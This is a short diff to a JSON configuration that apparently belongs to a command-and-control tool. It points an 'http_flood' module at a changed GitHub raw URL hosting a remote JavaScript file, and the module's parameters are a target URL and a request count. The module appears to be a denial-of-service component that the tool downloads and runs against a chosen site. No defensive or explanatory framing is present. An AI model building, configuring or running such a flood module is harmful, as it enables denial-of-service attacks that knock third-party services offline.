@@ -1,7 +1,7 @@
 {
    
     "http_flood": {
-        "url": "https://raw.githubusercontent.com/sizinrepo/c2modules/main/http_flood.js",
+        "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/http_fload.js",
         "params": {
             "url": {"required": true, "type": "string"},
             "requests": {"required": true, "type": "number"},
